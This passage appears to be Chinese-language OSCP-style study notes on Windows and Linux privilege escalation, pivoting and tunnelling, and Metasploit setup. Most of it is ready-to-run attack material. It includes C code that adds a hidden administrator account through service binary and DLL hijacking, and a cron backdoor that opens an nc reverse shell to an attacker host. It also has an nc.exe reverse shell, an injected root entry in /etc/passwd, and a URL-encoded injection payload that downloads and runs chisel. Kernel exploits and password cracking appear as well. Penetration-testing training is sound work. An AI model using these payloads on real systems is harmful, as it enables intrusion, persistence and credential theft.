+<pre><code class="language-armasm">type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+</code></pre>
+<p>历史文件中找到敏感文件</p>
+<pre><code class="language-armasm">type C:\Users\Public\Transcripts\transcript01.txt
+</code></pre>
+<p>敏感文件里有密码和session连接信息，使用信息进行session连接</p>
+<pre><code class="language-armasm">$password = ConvertTo-SecureString &quot;qwertqwertqwert123!!&quot; -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential(&quot;daveadmin&quot;, $password)
+Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
+whoami
+</code></pre>
+<p>PSSession下执行命令可能没有回显，使用winrm，主要密码中特殊字符需要转译</p>
+<pre><code class="language-armasm">evil-winrm -i 192.168.50.220 -u daveadmin -p &quot;qwertqwertqwert123\!\!&quot;
+</code></pre>
+<h3 id="1615-自动枚举">16.1.5 自动枚举</h3>
+<p>winpeas</p>
+<pre><code class="language-armasm">cp /usr/share/peass/winpeas/winPEASx64.exe .
+python3 -m http.server 80
+
+powershell
+iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
+.\winPEAS.exe
+</code></pre>
+<h2 id="162-利用windows服务">16.2 利用Windows服务</h2>
+<h3 id="1621-服务二进制文件劫持">16.2.1 服务二进制文件劫持</h3>
+<p>查看服务</p>
+<pre><code class="language-armasm">Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+</code></pre>
+<p>查看服务的二进制文件访问权限</p>
+<pre><code class="language-armasm">icacls &quot;C:\xampp\apache\bin\httpd.exe&quot;
+icacls &quot;C:\xampp\mysql\bin\mysqld.exe&quot;
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Mask掩模</th>
+<th>Permissions权限</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>F</td>
+<td>Full access完全访问权限</td>
+</tr>
+<tr>
+<td>M</td>
+<td>Modify access修改访问</td>
+</tr>
+<tr>
+<td>RX</td>
+<td>Read and execute access读取和执行访问</td>
+</tr>
+<tr>
+<td>R</td>
+<td>Read-only access只读访问</td>
+</tr>
+<tr>
+<td>W</td>
+<td>Write-only access只写存取</td>
+</tr>
+</tbody>
+</table>
+<p>关注F和W权限的</p>
+<p>创建添加用户程序</p>
+<pre><code class="language-armasm">#include &lt;stdlib.h&gt;
+
+int main ()
+{
+  int i;
+  
+  i = system (&quot;net user dave2 password123! /add&quot;);
+  i = system (&quot;net localgroup administrators dave2 /add&quot;);
+  
+  return 0;
+}
+</code></pre>
+<p>编译</p>
+<pre><code class="language-armasm">x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+</code></pre>
+<p>下载替换文件</p>
+<pre><code class="language-armasm">iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
+move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
+move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
+</code></pre>
+<p>重启服务</p>
+<pre><code class="language-armasm">net stop mysql
+</code></pre>
+<p>如果没有权限，可以看看服务是不是开机自启，如果是就看看是不是可以重启机器</p>
+<pre><code class="language-armasm">Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
+whoami /priv
+有SeShutdownPrivilege就可以重启
+
+shutdown /r /t 0
+
+重启后查看用户
+Get-LocalGroupMember administrators
+</code></pre>
+<p>也可以使用自动化工具PowerUp.ps1</p>
+<pre><code class="language-armasm">cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
+python3 -m http.server 80
+
+iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
+powershell -ep bypass
+. .\PowerUp.ps1
+Get-ModifiableServiceFile
+Install-ServiceBinary -Name 'mysql'
+</code></pre>
+<p>报错，有时不能盲目相信自动化工具，需要手动利用。</p>
+<h3 id="1622-服务dll劫持">16.2.2 服务DLL劫持</h3>
+<p>枚举服务</p>
+<pre><code class="language-armasm">Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+</code></pre>
+<p>查看二进制文件权限</p>
+<pre><code class="language-armasm">icacls .\Documents\BetaServ.exe
+</code></pre>
+<p>可读可执行，不能替换，使用Procmon64.exe查看进程调用dll情况</p>
+<p>点击Filter添加过滤规则</p>
+<pre><code class="language-armasm">Process Name is BetaServ.exe 
+</code></pre>
+<p>然后重启服务</p>
+<pre><code class="language-armasm">Restart-Service BetaService
+</code></pre>
+<p>看到多次调用myDLL.dll</p>
+<p>查看环境变量</p>
+<pre><code class="language-armasm">PS C:\Users\steve&gt; $env:path
+C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\steve\AppData\Local\Microsoft\WindowsApps;
+</code></pre>
+<p>在第一个调用路径上放置dll文件</p>
+<pre><code class="language-armasm">#include &lt;stdlib.h&gt;
+#include &lt;windows.h&gt;
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system (&quot;net user dave2 password123! /add&quot;);
+  	    i = system (&quot;net localgroup administrators dave2 /add&quot;);
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+</code></pre>
+<p>编译</p>
+<pre><code class="language-armasm">x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
+</code></pre>
+<p>放置在一个调用路径，需要是一个可写目录，如：</p>
+<pre><code class="language-armasm">C:\Users\steve\Documents 
+</code></pre>
+<pre><code class="language-armasm">cd Documents
+iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll
+net user
+</code></pre>
+<p>重启服务，dll被加载，代码被运行</p>
+<pre><code class="language-armasm">Restart-Service BetaService
+net user
+net localgroup administrators
+</code></pre>
+<p>添加管理员成功</p>
+<h3 id="1623-无引号文件路径">16.2.3 无引号文件路径</h3>
+<p>路径中存在空格时且路径没有被引号包裹，文件执行顺序如下：</p>
+<pre><code class="language-armasm">C:\Program Files\My Program\My Service\service.exe
+顺序：
+C:\Program.exe
+C:\Program Files\My.exe
+C:\Program Files\My Program\My.exe
+C:\Program Files\My Program\My service\service.exe
+</code></pre>
+<p>枚举服务和路径信息（powershell）</p>
+<pre><code class="language-armasm">Get-CimInstance -ClassName win32_service | Select Name,State,PathName
+</code></pre>
+<p>枚举没有引号路径的服务（cmd）</p>
+<pre><code class="language-armasm">wmic service get name,pathname |  findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot;
+</code></pre>
+<p>发现服务</p>
+<pre><code class="language-armasm">Name                                       PathName                                                                   
+...                                                                                                       
+GammaService                               C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
+</code></pre>
+<p>测试起是否可以被启动和停止</p>
+<pre><code class="language-armasm">Start-Service GammaService
+Stop-Service GammaService
+</code></pre>
+<p>文件执行顺序</p>
+<pre><code class="language-armasm">C:\Program.exe
+C:\Program Files\Enterprise.exe
+C:\Program Files\Enterprise Apps\Current.exe
+C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
+</code></pre>
+<p>检查路径是否可写</p>
+<pre><code class="language-armasm">icacls &quot;C:\&quot;
+icacls &quot;C:\Program Files&quot;
+icacls &quot;C:\Program Files\Enterprise Apps&quot;
+</code></pre>
+<p>需要有F或者W权限，如</p>
+<pre><code class="language-armasm">C:\Program Files\Enterprise Apps
+</code></pre>
+<pre><code class="language-armasm">iwr -uri http://192.168.119.3/adduser.exe -Outfile Current.exe
+copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
+Start-Service GammaService
+
+net user
+net localgroup administrators
+</code></pre>
+<p>自动化工具PowerUp</p>
+<pre><code class="language-armasm">iwr http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
+powershell -ep bypass
+. .\PowerUp.ps1
+Get-UnquotedService
+
+Write-ServiceBinary -Name 'GammaService' -Path &quot;C:\Program Files\Enterprise Apps\Current.exe&quot;
+Restart-Service GammaService
+net user
+net localgroup administrators
+</code></pre>
+<h2 id="163-利用其他windows组件">16.3 利用其他Windows组件</h2>
+<h3 id="1631-计划任务">16.3.1 计划任务</h3>
+<p>查看</p>
+<pre><code class="language-armasm">schtasks /query /fo LIST /v
+</code></pre>
+<p>关注任务名、下一次执行时间、作者、文件路径等信息</p>
+<p>查看是否可以替换</p>
+<pre><code class="language-armasm">icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
+</code></pre>
+<p>替换</p>
+<pre><code class="language-armasm">iwr -Uri http://192.168.119.3/adduser.exe -Outfile BackendCacheCleanup.exe
+move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
+move .\BackendCacheCleanup.exe .\Pictures\
+</code></pre>
+<p>等执行时间过后，查看</p>
+<pre><code class="language-armasm">net user
+net localgroup administrators
+</code></pre>
+<h3 id="1632-使用漏洞">16.3.2 使用漏洞</h3>
+<p>查看权限</p>
+<pre><code class="language-armasm">whoami /priv
+</code></pre>
+<p>有SeImpersonatePrivilege可以用PrintSpoofer或者土豆系列</p>
+<pre><code class="language-armasm">wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+python3 -m http.server 80
+
+powershell
+iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
+.\PrintSpoofer64.exe -i -c powershell.exe
+whoami
+</code></pre>
+<h2 id="171-linux提权信息枚举">17.1 linux提权信息枚举</h2>
+<h3 id="1712-手动枚举">17.1.2 手动枚举</h3>
+<p>文件权限</p>
+<pre><code class="language-armasm">ls -l /etc/shadow
+</code></pre>
+<p>当前用户id</p>
+<pre><code class="language-armasm">id
+</code></pre>
+<p>所有用户</p>
+<pre><code class="language-armasm">cat /etc/passwd
+</code></pre>
+<p>主机名</p>
+<pre><code class="language-armasm">hostname
+</code></pre>
+<p>操作系统信息</p>
+<pre><code class="language-armasm">cat /etc/issue
+cat /etc/os-release
+uname -a
+</code></pre>
+<p>进程信息</p>
+<pre><code class="language-armasm">ps aux
+</code></pre>
+<p>关注root权限的</p>
+<p>网络信息</p>
+<pre><code class="language-armasm">ip a
+routel
+ss -anp
+</code></pre>
+<p>防火墙规则</p>
+<pre><code class="language-armasm">cat /etc/iptables/rules.v4
+</code></pre>
+<p>计划任务</p>
+<pre><code class="language-armasm">ls -lah /etc/cron*
+</code></pre>
+<p>关注是否有root权限的文件可以替换</p>
+<p>查看当前用户计划任务</p>
+<pre><code class="language-armasm">crontab -l
+sudo crontab -l
+</code></pre>
+<p>查看已安装程序</p>
+<pre><code class="language-armasm">dpkg -l
+</code></pre>
+<p>搜索可写目录</p>
+<pre><code class="language-armasm">find / -writable -type d 2&gt;/dev/null
+</code></pre>
+<p>查看已安装文件系统和驱动器</p>
+<pre><code class="language-armasm">cat /etc/fstab
+mount
+</code></pre>
+<p>查看可用磁盘</p>
+<pre><code class="language-armasm">lsblk
+</code></pre>
+<p>可能有未挂载的磁盘里面有敏感信息</p>
+<p>查看内核模块</p>
+<pre><code class="language-armasm">lsmod
+</code></pre>
+<p>查看模块信息</p>
+<pre><code class="language-armasm">/sbin/modinfo libata
+</code></pre>
+<p>查找SUID二进制文件</p>
+<pre><code class="language-armasm">find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre>
+<h3 id="1713-自动枚举">17.1.3 自动枚举</h3>
+<pre><code class="language-armasm">unix-privesc-check
+./unix-privesc-check standard &gt; output.txt
+</code></pre>
+<p>如/etc/passwd文件可写提权</p>
+<p>https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation</p>
+<p>其他辅助脚本</p>
+<pre><code class="language-armasm">https://github.com/rebootuser/LinEnum
+https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+</code></pre>
+<h2 id="172-敏感信息">17.2 敏感信息</h2>
+<h3 id="1721-用户配置中的敏感信息">17.2.1 用户配置中的敏感信息</h3>
+<p>环境变量（比如密码等信息）</p>
+<pre><code class="language-armasm">env
+</code></pre>
+<p>bash配置文件（比如密码等信息）</p>
+<pre><code class="language-armasm">cat .bashrc
+</code></pre>
+<p>找到密码后切换用户</p>
+<pre><code class="language-armasm">su - root
+whoami
+</code></pre>
+<p>根据密码做字典</p>
+<pre><code class="language-armasm">crunch 6 6 -t Lab%%% &gt; wordlist
+</code></pre>
+<p>破解指定用户密码</p>
+<pre><code class="language-armasm">hydra -l eve -P wordlist  192.168.50.214 -t 4 ssh -V
+</code></pre>
+<p>登录后查看sudo</p>
+<pre><code class="language-armasm">ssh eve@192.168.50.214
+sudo -l
+
+User eve may run the following commands on debian-privesc:
+    (ALL : ALL) ALL
+</code></pre>
+<p>直接sudo提权</p>
+<pre><code class="language-armasm">sudo -i
+输入eve密码，获得root
+whoami
+</code></pre>
+<h3 id="1722-服务运行痕迹">17.2.2 服务运行痕迹</h3>
+<p>监测进程中的敏感信息</p>
+<pre><code class="language-armasm">watch -n 1 &quot;ps -aux | grep pass&quot;
+</code></pre>
+<p>监测网络通信中的敏感信息</p>
+<pre><code class="language-armasm">sudo tcpdump -i lo -A | grep &quot;pass&quot;
+</code></pre>
+<h2 id="173-不安全的文件权限">17.3 不安全的文件权限</h2>
+<h3 id="1731-利用cron">17.3.1 利用CRON</h3>
+<p>查看cron日志</p>
+<pre><code class="language-armasm">grep &quot;CRON&quot; /var/log/syslog
+</code></pre>
+<p>关注root定时运行的文件，找到后查看内容和权限</p>
+<pre><code class="language-armasm">cat /home/joe/.scripts/user_backups.sh
+ls -lah /home/joe/.scripts/user_backups.sh
+</code></pre>
+<p>可写，插入一句话后门</p>
+<pre><code class="language-armasm">cd .scripts
+echo &gt;&gt; user_backups.sh
+echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.118.2 1234 &gt;/tmp/f&quot; &gt;&gt; user_backups.sh
+cat user_backups.sh
+
+nc -lnvp 1234
+</code></pre>
+<h3 id="1732-利用密码校验">17.3.2 利用密码校验</h3>
+<p>/etc/passwd可写</p>
+<pre><code class="language-armasm">openssl passwd w00t
+echo &quot;root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd
+su root2
+Password: w00t
+id
+</code></pre>
+<h2 id="174-不安全系统组件">17.4 不安全系统组件</h2>
+<h3 id="1741-利用setuid二进制文件">17.4.1 利用Setuid二进制文件</h3>
+<p>查看文件的SUID标志位</p>
+<pre><code class="language-armasm">ls -asl /usr/bin/passwd
+</code></pre>
+<p>find</p>
+<pre><code class="language-armasm">find /home/joe/Desktop -exec &quot;/usr/bin/bash&quot; -p \;
+</code></pre>
+<p>getcap</p>
+<pre><code class="language-armasm">/usr/sbin/getcap -r / 2&gt;/dev/null
+</code></pre>
+<p>perl</p>
+<pre><code class="language-armasm">perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/sh&quot;;'
+</code></pre>
+<p>更多suid提权利用查看</p>
+<p>https://gtfobins.github.io/</p>
+<h3 id="1742-sudo利用">17.4.2 sudo利用</h3>
+<p>查看当前用户可以使用的特权命令</p>
+<pre><code class="language-armasm">sudo -l
+</code></pre>
+<p>查看https://gtfobins.github.io/，发现</p>
+<pre><code class="language-armasm">COMMAND='id'
+TF=$(mktemp)
+echo &quot;$COMMAND&quot; &gt; $TF
+chmod +x $TF
+sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
+</code></pre>
+<p>没有成功，提示</p>
+<pre><code class="language-armasm">failed: Permission denied
+</code></pre>
+<p>查看日志</p>
+<pre><code class="language-armasm">cat /var/log/syslog | grep tcpdump
+</code></pre>
+<p>发现是AppArmor限制了，root权限后查看apparmor状态信息</p>
+<pre><code class="language-armasm">su - root
+aa-status
+发现
+/usr/sbin/tcpdump
+</code></pre>
+<p>换一个apt-get</p>
+<pre><code class="language-armasm">sudo apt-get changelog apt
+!/bin/sh
+</code></pre>
+<p>提权成功</p>
+<h3 id="1743-内核漏洞提权">17.4.3 内核漏洞提权</h3>
+<p>查看架构及内核版本信息</p>
+<pre><code class="language-armasm">cat /etc/issue
+uname -r
+arch
+</code></pre>
+<p>搜索漏洞</p>
+<pre><code class="language-armasm">searchsploit &quot;linux kernel Ubuntu 16 Local Privilege Escalation&quot;   | grep  &quot;4.&quot; | grep -v &quot; &lt; 4.4.0&quot; | grep -v &quot;4.8&quot;
+</code></pre>
+<pre><code class="language-armasm">cp /usr/share/exploitdb/exploits/linux/local/45010.c .
+head 45010.c -n 20
+mv 45010.c cve-2017-16995.c
+scp cve-2017-16995.c joe@192.168.123.216:
+gcc cve-2017-16995.c -o cve-2017-16995
+file cve-2017-16995
+./cve-2017-16995
+</code></pre>
+<h2 id="182-使用linux工具端口转发">18.2 使用linux工具端口转发</h2>
+<h3 id="1823-socat端口转发">18.2.3 socat端口转发</h3>
+<p>跳板机上</p>
+<pre><code class="language-armasm">socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
+</code></pre>
+<p>kali上连接跳板机的2345端口就会转发到内网10.4.50.215:5432端口</p>
+<pre><code class="language-armasm">psql -h 192.168.50.63 -p 2345 -U postgres
+</code></pre>
+<p>登录postgres数据库，查看数据库信息，查看表信息，查看内容</p>
+<pre><code class="language-armasm">\l
+\c confluence
+select * from cwd_user;
+</code></pre>
+<p>获得密码进行暴力破解</p>
+<pre><code class="language-armasm">hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt
+</code></pre>
+<p>破解出密码后，在跳板机上做端口转发</p>
+<pre><code class="language-armasm">socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
+</code></pre>
+<p>kali上ssh连上去</p>
+<pre><code class="language-armasm">ssh database_admin@192.168.50.63 -p2222
+</code></pre>
+<h2 id="183-ssh隧道">18.3 SSH隧道</h2>
+<h3 id="1831-本地端口转发">18.3.1 本地端口转发</h3>
+<p>kali（192）---跳板1（192和10）---跳板2（10和172）--目标（172）</p>
+<p>ssh需要交互式shell操作，需要在跳板1上转换交互式shell</p>
+<pre><code class="language-armasm">python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+ssh database_admin@10.4.50.215
+ip addr
+</code></pre>
+<p>在跳板2上发现172段，查看路由，并扫描172段存活主机445端口</p>
+<pre><code class="language-armasm">ip route
+for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
+</code></pre>
+<p>发现一台</p>
+<pre><code class="language-armasm">172.16.50.217 445
+</code></pre>
+<p>现在想要在kali上连接172段的445端口</p>
+<p>在跳板1上做本地端口转发到跳板2的172段</p>
+<pre><code class="language-armasm">ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
+ss -ntplu
+</code></pre>
+<p>kali上连接</p>
+<pre><code class="language-armasm">smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
+smbclient -p 4455 //192.168.50.63/scripts -U hr_admin --password=Welcome1234
+ls
+get Provisioning.ps1
+</code></pre>
+<p>成功下载172主机上的ps1文件</p>
+<h3 id="1832-动态端口转发">18.3.2 动态端口转发</h3>
+<p>kali（192）---跳板1（192和10）---跳板2（10和172）--目标（172）</p>
+<p>跳板1上开启9999端口做socks代理</p>
+<pre><code class="language-armasm">python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
+</code></pre>
+<p>kali上设置proxychains4</p>
+<pre><code class="language-armasm">tail /etc/proxychains4.conf
+
+socks5 192.168.50.63 9999
+</code></pre>
+<pre><code class="language-armasm">proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
+
+proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
+</code></pre>
+<h3 id="1833-远程端口转发">18.3.3 远程端口转发</h3>
+<p>kali（192）---跳板1（192和10）---跳板2（10和172）</p>
+<p>kali上开启ssh服务</p>
+<pre><code class="language-armasm">sudo systemctl start ssh
+sudo ss -ntplu
+</code></pre>
+<p>跳板1上ssh连接kali</p>
+<pre><code class="language-armasm">python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
+</code></pre>
+<p>连接成功后kali上会开启2345端口，kali上连接自己的2345就是跳板2的5432端口</p>
+<pre><code class="language-armasm">ss -ntplu
+psql -h 127.0.0.1 -p 2345 -U postgres
+</code></pre>
+<h3 id="1834-远程动态端口转发">18.3.4 远程动态端口转发</h3>
+<p>kali（192）---跳板1（192和10）---跳板2（10和172）</p>
+<p>跳板1上ssh连接kali</p>
+<pre><code class="language-armasm">python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+ssh -N -R 9998 kali@192.168.118.4
+</code></pre>
+<p>连接成功后kali上开启了9998的socks代理</p>
+<pre><code class="language-armasm">sudo ss -ntplu
+tail /etc/proxychains4.conf
+socks5 127.0.0.1 9998
+proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64
+</code></pre>
+<h3 id="1835-sshuttle">18.3.5 sshuttle</h3>
+<p>kali（192）---跳板1（192和10）---跳板2（10和172）--目标（172）</p>
+<p>跳板1上做端口转发</p>
+<pre><code class="language-armasm">socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
+</code></pre>
+<p>kali上通过跳板1的转发ssh到跳板2上，并添加10和172网段</p>
+<pre><code class="language-armasm">sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
+</code></pre>
+<p>连接成功后kali可以直接访问10和172段</p>
+<pre><code class="language-armasm">smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
+</code></pre>
+<h2 id="184-windows端口转发工具">18.4 Windows端口转发工具</h2>
+<h3 id="1841-sshexe">18.4.1 ssh.exe</h3>
+<p>kali（192）---win跳板1（192和10）---目标（10）</p>
+<p>kali上开启ssh服务</p>
+<pre><code class="language-armasm">sudo systemctl start ssh
+</code></pre>
+<p>rdp到跳板1上，找到ssh.exe，连接kali</p>
+<pre><code class="language-armasm">xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64
+where ssh
+ssh.exe -V
+版本高于7.6才可以做端口转发
+ssh -N -R 9998 kali@192.168.118.4
+</code></pre>
+<p>kali上开启了9998的socks代理，配置proxychains后可以连10段主机</p>
+<pre><code class="language-armasm">ss -ntplu
+tail /etc/proxychains4.conf
+socks5 127.0.0.1 9998
+proxychains psql -h 10.4.50.215 -U postgres
+\l
+</code></pre>
+<h3 id="1842-plink">18.4.2 plink</h3>
+<p>kali（192）---防火墙（屏蔽连接跳板1的3389端口）---win跳板1（192）</p>
+<p>开上开启80端口web服务供下载文件</p>
+<pre><code class="language-armasm">sudo systemctl start apache2
+find / -name nc.exe 2&gt;/dev/null
+sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/
+find / -name plink.exe 2&gt;/dev/null
+sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
+
+nc -nvlp 4446
+</code></pre>
+<p>跳板1上使用webshell下载nc，反弹shell到kali上</p>
+<pre><code class="language-armasm">powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe
+C:\Windows\Temp\nc.exe -e cmd.exe 192.168.118.4 4446
+powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe
+</code></pre>
+<p>下载plink后，做ssh到kali，开启kali的9833端口，连接到跳板1的3389端口</p>
+<pre><code class="language-armasm">C:\Windows\Temp\plink.exe -ssh -l kali -pw &lt;YOUR PASSWORD HERE&gt; -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
+</code></pre>
+<p>kali上查看开启端口，并rdp本机9833就是跳板1的3389端口</p>
+<pre><code class="language-armasm">ss -ntplu
+xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
+</code></pre>
+<h3 id="1843-netsh">18.4.3 Netsh</h3>
+<p>kali（192）---win跳板1（192和10）---目标（10）</p>
+<p>跳板1上做转发</p>
+<pre><code class="language-armasm">xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64
+管理员运行cmd
+netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
+</code></pre>
+<p>映射跳板2222端口到目标的22端口，查看跳板2222是否开放及代理列表</p>
+<pre><code class="language-armasm">netstat -anp TCP | find &quot;2222&quot;
+netsh interface portproxy show all
+</code></pre>
+<p>kali扫描跳板的2222端口</p>
+<pre><code class="language-armasm">sudo nmap -sS 192.168.50.64 -Pn -n -p2222
+</code></pre>
+<p>不成功，因为Windows防火墙会阻止kali连接2222端口，防火墙增加一条规则，允许入向连接2222端口</p>
+<pre><code class="language-armasm">netsh advfirewall firewall add rule name=&quot;port_forward_ssh_2222&quot; protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
+</code></pre>
+<p>kali连接目标成功</p>
+<pre><code class="language-armasm">sudo nmap -sS 192.168.50.64 -Pn -n -p2222
+ssh database_admin@192.168.50.64 -p2222
+</code></pre>
+<p>删除防火墙及代理策略</p>
+<pre><code class="language-armasm">netsh advfirewall firewall delete rule name=&quot;port_forward_ssh_2222&quot;
+netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
+</code></pre>
+<h2 id="191-http隧道">19.1 HTTP隧道</h2>
+<h3 id="1912-使用chisel搭建http隧道">19.1.2 使用chisel搭建HTTP隧道</h3>
+<p>kali（192）---linux跳板1（192和10）---目标（10）</p>
+<p>kali开启web服务提供下载chisel使用，并开启chisel反向代理</p>
+<pre><code class="language-armasm">sudo systemctl start apache2
+wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
+gunzip chisel_1.8.1_linux_amd64.gz
+sudo cp ./chisel /var/www/html
+
+chisel server --port 8080 --reverse
+</code></pre>
+<p>在linux跳板1上下载并执行</p>
+<pre><code class="language-armasm">wget 192.168.118.4/chisel -O /tmp/chisel &amp;&amp; chmod +x /tmp/chisel
+/tmp/chisel client 192.168.118.4:8080 R:socks &gt; /dev/null 2&gt;&amp;1 &amp;
+</code></pre>
+<p>linux跳板1上是使用web漏洞进行命令执行的，需要url编码</p>
+<pre><code class="language-armasm">curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.118.4/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
+
+curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%27%29.start%28%29%22%29%7D/
+</code></pre>
+<p>kali上查看，默认是1080端口开socks服务，安装ncat，ssh到10段通过本地的1080端口socks转发</p>
+<pre><code class="language-armasm">ss -ntplu
+sudo apt install ncat
+ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
+</code></pre>
+<h2 id="192-dns隧道">19.2 DNS隧道</h2>
+<h3 id="1922-使用dnscat2搭建dns隧道">19.2.2 使用dnscat2搭建DNS隧道</h3>
+<p>kali（192）---……---跳板（任意和172）--目标（172）</p>
+<p>前提是跳板发出的dns请求不管转发多少次，最终由kali上的服务端解析</p>
+<p>在kali上启动dnscat2的服务端</p>
+<pre><code class="language-armasm">dnscat2-server feline.corp
+</code></pre>
+<p>启动后会开启53端口监听</p>
+<p>跳板上启动dnscat2客户端</p>
+<pre><code class="language-armasm">./dnscat feline.corp
+</code></pre>
+<p>运行成功后会在服务端看到客户端连接成功，查看并配置客户端转发策略，就可以本地连接目标172主机</p>
+<pre><code class="language-armasm">windows
+window -i 1
+?
+listen --help
+listen 127.0.0.1:4455 172.16.2.11:445
+
+smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
+</code></pre>
+<h2 id="201-熟悉metasploit框架">20.1 熟悉Metasploit框架</h2>
+<h3 id="2011-msf基本设置">20.1.1 MSF基本设置</h3>
+<p>数据库初始化</p>
+<pre><code class="language-armasm">sudo msfdb init
+</code></pre>
+<p>如果想开机启动数据库可以</p>
+<pre><code class="language-armasm">sudo systemctl enable postgresql
+</code></pre>
+<p>启动MSF并查看数据库状态</p>
+<pre><code class="language-armasm">sudo msfconsole
+db_status
+</code></pre>
+<p>帮助命令</p>
+<pre><code class="language-armasm">help
+</code></pre>
+<p>查看并新建工作区</p>
+<pre><code class="language-armasm">workspace
+workspace -a pen200
+</code></pre>
+<p>nmap扫描并将结果存进数据库</p>
+<pre><code class="language-armasm">db_nmap
+db_nmap -A 192.168.50.202
+</code></pre>
+<p>在数据库里查看主机、服务、指定端口服务</p>
+<pre><code class="language-armasm">hosts
+services
+services -p 8000
+</code></pre>
+<p>命令帮助信息查询</p>
+<pre><code class="language-armasm">show -h
+</code></pre>
+<h3 id="2012-工具模块">20.1.2 工具模块</h3>
+<p>查看</p>
+<pre><code class="language-armasm">show auxiliary
+</code></pre>
